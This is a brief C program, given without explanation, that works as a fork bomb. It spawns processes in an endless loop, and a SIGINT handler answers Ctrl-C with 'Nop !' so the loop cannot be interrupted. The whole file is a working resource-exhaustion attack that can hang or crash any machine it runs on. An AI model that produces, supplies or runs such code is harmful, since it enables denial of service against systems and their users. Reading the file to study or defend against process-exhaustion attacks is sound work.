#include<stdio.h>

void hand(int s){
signal(2,hand);
printf("Nop !\n");
}

int main(){
signal(2,hand);
while(1)
	fork();
return 0;
}
